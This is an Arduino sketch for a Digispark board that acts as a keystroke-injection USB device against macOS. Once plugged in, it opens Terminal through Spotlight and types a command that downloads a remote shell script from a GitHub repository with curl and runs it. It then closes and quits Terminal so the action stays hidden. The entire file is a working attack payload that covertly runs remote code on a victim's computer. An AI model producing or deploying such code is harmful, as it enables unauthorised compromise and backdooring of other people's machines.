#include "DigiKeyboard.h"

int LED_PIN = 1;

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  initKb();
  openapp("terminal");
  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("sh -c \"$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/go.sh)\"");
  delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(LED_PIN, LOW);
}

void loop(){
}

void initKb(){
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);  
}

void openapp(String app){
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.println(app);
}

